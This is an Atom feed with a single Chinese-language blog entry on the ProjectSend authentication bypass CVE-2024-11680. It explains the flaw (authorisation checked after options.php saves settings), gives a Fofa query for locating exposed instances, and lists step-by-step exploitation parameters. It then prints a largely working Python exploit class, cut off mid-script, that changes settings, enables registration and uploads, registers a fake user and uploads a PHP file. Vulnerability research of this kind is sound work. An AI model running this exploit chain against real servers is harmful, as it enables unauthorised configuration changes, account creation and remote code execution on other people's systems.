<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0or1zo</title>
  
  <subtitle>为了防止世界被破坏，为了守护世界的和平；贯彻爱与真实的邪恶，可爱又迷人的反派角色~</subtitle>
  <link href="https://0or1zo.github.io/atom.xml" rel="self"/>
  
  <link href="https://0or1zo.github.io/"/>
  <updated>2024-12-12T12:28:52.807Z</updated>
  <id>https://0or1zo.github.io/</id>
  
  <author>
    <name>0or1zo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ProjectSend身份认证绕过漏洞(CVE-2024-11680)</title>
    <link href="https://0or1zo.github.io/2024/12/10/ProjectSend%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2024-11680/"/>
    <id>https://0or1zo.github.io/2024/12/10/ProjectSend%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2024-11680/</id>
    <published>2024-12-10T12:05:09.000Z</published>
    <updated>2024-12-12T12:28:52.807Z</updated>
    
    <content type="html"><![CDATA[<ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-11680">CVE-2024-11680</a>（CVSS 评分：9.8）- <strong>ProjectSend r1720之前的版本受到身份验证漏洞的影响。远程未经身份验证的攻击者可以通过向options.php发送精心设计的HTTP请求来利用此漏洞，从而实现对应用程序配置的未经授权的修改。成功利用此漏洞后，攻击者可以创建帐户、上传webshel​​l并嵌入恶意JavaScript。</strong></li></ul><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>ProjectSend &lt;&#x3D; <code>r1605</code></p><h1 id="目标探测"><a href="#目标探测" class="headerlink" title="目标探测"></a>目标探测</h1><p>Fofa：<code>body=&quot;ProjectSend&quot;</code></p><p><img src="/img/ProjectSend%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2024-11680/1.png"></p><p>用nuclei探测是否存在漏洞，<a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/http/vulnerabilities/projectsend-auth-bypass.yaml">POC模板</a></p><p><img src="/img/ProjectSend%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2024-11680/2.png"></p><div class="note warning flat"><p>nuclei的poc模板中存在一处纰漏，其中验证poc中有一个过程以响应状态码作为判断条件。起初在本地搭建漏洞环境测试时，使用该模板没有检测出漏洞，后逐步检测模板代码和过程包发现，本地触发漏洞的响应状态码为200，与模板代码中的判断条件不匹配。接着又在网上找了几个存在漏洞的目标（版本未知），发现触发漏洞的响应状态码存在200和500两种情况（原因尚未查明），于是给漏洞检测模板增加了一个判断条件，如下图所示：</p></div><p><img src="/img/ProjectSend%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2024-11680/3.png"></p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>ProjectSend应用程序实施了不同级别的授权，以限制允许特定用户使用哪些功能。授权检查在<code>header.php</code>脚本中执行，以确保用户已登录并具有正确的权限级别。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// Check for an active session</span></span><br><span class="line"><span class="title function_ invoke__">redirect_if_not_logged_in</span>();</span><br><span class="line"><span class="comment">// Check if the current user has permission to view this page.</span></span><br><span class="line"><span class="title function_ invoke__">redirect_if_role_not_allowed</span>(<span class="variable">$allowed_levels</span>);</span><br></pre></td></tr></table></figure><p>在应用程序的几个PHP页面上，授权检查是在执行其余代码之后执行的，允许未经身份验证或权限较低的用户执行特权操作。例如，在<code>options.php</code>脚本（负责更新应用程序的配置）中，授权检查是在用户提供的所有更新值存储在数据库中之后执行的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allowed_levels</span> = <span class="keyword">array</span>(<span class="number">9</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;bootstrap.php&#x27;</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">/** Form sent */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="variable">$updated</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$options_total</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$save</span> = <span class="title function_ invoke__">save_option</span>(<span class="variable">$keys</span>[<span class="variable">$j</span>], <span class="variable">$_POST</span>[<span class="variable">$keys</span>[<span class="variable">$j</span>]]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$save</span>) &#123;</span><br><span class="line">            <span class="variable">$updated</span>++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">include_once</span> ADMIN_VIEWS_DIR . DS . <span class="string">&#x27;header.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h1><p>通过发送特制的请求，可以更改应用程序的配置。例如，构造以下请求允许未经身份验证的用户更改应用程序安装的标题。</p><ul><li><p><strong>访问<code>index.php</code>页面，获取响应包中的<code>title</code>和<code>csrf_token</code>以及响应头中未认证的<code>PHPSESSID</code>，然后发送特制的请求至<code>options.php</code></strong></p></li><li><p><strong>更改应用程序安装的标题的配置参数为<code>section=general</code>与<code>this_install_title=new_title_name</code></strong></p></li></ul><p><img src="/img/ProjectSend%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2024-11680/4.png"></p><div class="note info flat"><p>某些漏洞扫描器探测该应用程序是否存在漏洞就是通过触发漏洞进行更改标题，如更改成功，则代表存在漏洞，然后再通过漏洞将标题复原。</p></div><p>通过利用此漏洞，未经身份验证的用户可以在托管应用程序的服务器上上传可执行脚本，以此来获取代码执行的能力。操作如下：</p><ul><li><p><strong>利用<code>options.php</code>上的漏洞来启用用户注册、自动批准用户注册和文件上传选项</strong></p></li><li><p><strong>对应的配置参数为<code>section=clients</code>、<code>clients_can_register=1</code>、<code>clients_auto_approve=1</code>、<code>clients_can_upload=1</code></strong></p></li></ul><p><img src="/img/ProjectSend%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2024-11680/5.png"></p><p><img src="/img/ProjectSend%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2024-11680/6.png"></p><ul><li><strong>注册新用户并登录应用程序</strong></li></ul><p><img src="/img/ProjectSend%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2024-11680/7.png"></p><ul><li><strong>使用新创建的<code>rachelandrews</code>用户登录ProjectSend仪表板</strong></li></ul><p><img src="/img/ProjectSend%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2024-11680/8.png"></p><ul><li><p><strong>第一种：利用<code>options.php</code>上的漏洞将<code>.php</code>添加到允许上传文件的扩展名白名单中，对应的配置参数为<code>section=security</code>、<code>allowed_file_types=[&#123;&quot;value&quot;:&quot;php&quot;&#125;]</code></strong></p></li><li><p><strong>第二种：利用<code>options.php</code>上的漏洞禁用上传的后缀限制，对应的配置参数为<code>section=security</code>、<code>file_types_limit_to=noone</code></strong></p></li></ul><p><img src="/img/ProjectSend%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2024-11680/9.png"></p><ul><li><strong>以<code>rachelandrews</code>用户身份上传包含PHP代码的<code>.php</code>文件</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&#x27;Hello World&#x27;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/ProjectSend%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2024-11680/10.png"></p><ul><li><strong>由于上传的文件以可预测，文件以<code>(&#123;timestamp&#125;-&#123;sha1(username)&#125;-&#123;filename&#125;)</code>的命名规则存储在Web根目录下的<code>/upload/files/</code>中，因此可以通过使用GET请求访问脚本来触发PHP代码的执行</strong></li></ul><p><img src="/img/ProjectSend%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2024-11680/11.png"></p><h1 id="复现及exp"><a href="#复现及exp" class="headerlink" title="复现及exp"></a>复现及exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"><span class="keyword">from</span> faker <span class="keyword">import</span> Faker</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&quot;%(asctime)s %(message)s&quot;</span>)</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&#x27;ignore&#x27;</span>, message=<span class="string">&#x27;Unverified HTTPS request&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ProjectSendExploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target_url</span>):</span><br><span class="line">        <span class="variable language_">self</span>.target_url = target_url</span><br><span class="line">        <span class="variable language_">self</span>.session = requests.Session()</span><br><span class="line">        <span class="variable language_">self</span>.session.headers.update(&#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="variable language_">self</span>.faker = Faker()</span><br><span class="line">        <span class="variable language_">self</span>.csrf_token = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">make_request</span>(<span class="params">self, method, endpoint, **kwargs</span>):</span><br><span class="line">        url = urljoin(<span class="variable language_">self</span>.target_url, endpoint)</span><br><span class="line">        kwargs.update(&#123;</span><br><span class="line">            <span class="string">&#x27;timeout&#x27;</span>: <span class="number">30</span>,</span><br><span class="line">            <span class="string">&#x27;verify&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&#x27;allow_redirects&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&#x27;proxies&#x27;</span>: &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = <span class="variable language_">self</span>.session.request(method, url, **kwargs)</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            logging.error(<span class="string">f&quot;Request failed: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_csrf_token</span>(<span class="params">self, response</span>):</span><br><span class="line">        soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        token = soup.find(<span class="string">&#x27;input&#x27;</span>, &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;csrf_token&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> token:</span><br><span class="line">            <span class="keyword">return</span> token[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self</span>):</span><br><span class="line">        logging.info(<span class="string">f&quot;[+] Starting vulnerability check against <span class="subst">&#123;self.target_url&#125;</span> ...&quot;</span>)</span><br><span class="line">        response = <span class="variable language_">self</span>.make_request(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> response <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">            logging.error(<span class="string">&quot;Target is not reachable&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        logging.info(<span class="string">&quot;[-] Extracting CSRF token.&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.csrf_token = <span class="variable language_">self</span>.extract_csrf_token(response)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.csrf_token:</span><br><span class="line">            logging.error(<span class="string">&quot;CSRF token not found&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        logging.info(<span class="string">&quot;[-] Extracting website title.&quot;</span>)</span><br><span class="line">        title_regex = <span class="string">r&quot;&lt;title&gt;.*?&amp;raquo;\s+(.*?)&lt;/title&gt;&quot;</span></span><br><span class="line">        <span class="keyword">match</span> = re.search(title_regex, response.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">match</span>:</span><br><span class="line">            logging.error(<span class="string">&quot;Title not found or malformed response.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        original_title = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        logging.info(<span class="string">&quot;[-] Changing website title.&quot;</span>)</span><br><span class="line">        random_new_title = <span class="variable language_">self</span>.random_string(<span class="number">8</span>)</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;csrf_token&#x27;</span>: <span class="variable language_">self</span>.csrf_token,</span><br><span class="line">            <span class="string">&#x27;section&#x27;</span>: <span class="string">&#x27;general&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;this_install_title&#x27;</span>: random_new_title</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">self</span>.make_request(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;options.php&#x27;</span>, data=params)</span><br><span class="line"></span><br><span class="line">        response = <span class="variable language_">self</span>.make_request(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>)</span><br><span class="line">        <span class="keyword">match</span> = re.search(title_regex, response.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">match</span>:</span><br><span class="line">            logging.error(<span class="string">&quot;Title not found or malformed response.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        updated_title = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> updated_title == random_new_title:</span><br><span class="line">            logging.info(<span class="string">&quot;[!] Target is vulnerable, restoring the original title.&quot;</span>)</span><br><span class="line">            params[<span class="string">&#x27;this_install_title&#x27;</span>] = original_title</span><br><span class="line">            <span class="variable language_">self</span>.make_request(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;options.php&#x27;</span>, data=params)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enable_user_registration</span>(<span class="params">self</span>):</span><br><span class="line">        logging.info(<span class="string">&quot;[+] Enabling user registration, auto-approval and allow upload...&quot;</span>)</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;csrf_token&#x27;</span>: <span class="variable language_">self</span>.csrf_token,</span><br><span class="line">            <span class="string">&#x27;section&#x27;</span>: <span class="string">&#x27;clients&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;clients_can_register&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;clients_auto_approve&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;clients_can_upload&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">self</span>.make_request(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;options.php&#x27;</span>, data=params)</span><br><span class="line">        response = <span class="variable language_">self</span>.make_request(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Register as a new client.&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            logging.info(<span class="string">&quot;[!] User registration enabled.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.error(<span class="string">&quot;Failed to enable user registration.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">disable_upload_restrictions</span>(<span class="params">self</span>):</span><br><span class="line">        logging.info(<span class="string">&quot;[+] Disabling upload restrictions...&quot;</span>)</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;csrf_token&#x27;</span>: <span class="variable language_">self</span>.csrf_token,</span><br><span class="line">            <span class="string">&#x27;section&#x27;</span>: <span class="string">&#x27;security&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;file_types_limit_to&#x27;</span>: <span class="string">&#x27;noone&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">self</span>.make_request(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;options.php&#x27;</span>, data=params)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">register_new_user</span>(<span class="params">self</span>):</span><br><span class="line">        logging.info(<span class="string">&quot;[+] Registering new user...&quot;</span>)</span><br><span class="line">        username = <span class="variable language_">self</span>.faker.user_name()</span><br><span class="line">        password = <span class="variable language_">self</span>.random_string(<span class="number">8</span>)</span><br><span class="line">        email = <span class="variable language_">self</span>.faker.email()</span><br><span class="line">        address = <span class="variable language_">self</span>.random_string(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;csrf_token&#x27;</span>: <span class="variable language_">self</span>.csrf_token,</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: username,</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">            <span class="string">&#x27;email&#x27;</span>: email,</span><br><span class="line">            <span class="string">&#x27;address&#x27;</span>: address,</span><br><span class="line">        &#125;</span><br><span class="line">        response = <span class="variable language_">self</span>.make_request(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;register.php&quot;</span>, data=params)</span><br><span class="line">        <span class="keyword">if</span> response <span class="keyword">and</span> response.status_code != <span class="number">403</span>:</span><br><span class="line">            logging.info(<span class="string">f&quot;[!] Successfully registered: <span class="subst">&#123;username&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> username, password</span><br><span class="line">        logging.error(<span class="string">&quot;Failed to register new user.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        logging.info(<span class="string">f&quot;[+] Logging in as <span class="subst">&#123;username&#125;</span>...&quot;</span>)</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;csrf_token&#x27;</span>: <span class="variable language_">self</span>.csrf_token,</span><br><span class="line">            <span class="string">&#x27;do&#x27;</span>: <span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">        &#125;</span><br><span class="line">        response = <span class="variable language_">self</span>.make_request(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>, data=params)</span><br><span class="line">        <span class="keyword">if</span> response <span class="keyword">and</span> (<span class="built_in">any</span>(key.lower() == <span class="string">&quot;set-cookie&quot;</span> <span class="keyword">for</span> key <span class="keyword">in</span> response.headers) <span class="keyword">or</span></span><br><span class="line">                         (response.status_code == <span class="number">302</span> <span class="keyword">and</span> <span class="string">&#x27;/my_files/index.php&#x27;</span> <span class="keyword">in</span> response.headers.get(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;&#x27;</span>))):</span><br><span class="line">            logging.info(<span class="string">&quot;[!] Login successful.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        logging.error(<span class="string">&quot;Login failed.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">upload_file</span>(<span class="params">self</span>):</span><br><span class="line">        logging.info(<span class="string">&quot;[+] Uploading PHP shell file...&quot;</span>)</span><br><span class="line">        filename = <span class="variable language_">self</span>.random_string() + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line">        file_content = <span class="string">b&quot;&lt;?php echo &#x27;Hello World&#x27;;?&gt;&quot;</span></span><br><span class="line">        files = &#123;</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: (<span class="literal">None</span>, filename),</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>: (filename, file_content, <span class="string">&#x27;application/octet-stream&#x27;</span>),</span><br><span class="line">        &#125;</span><br><span 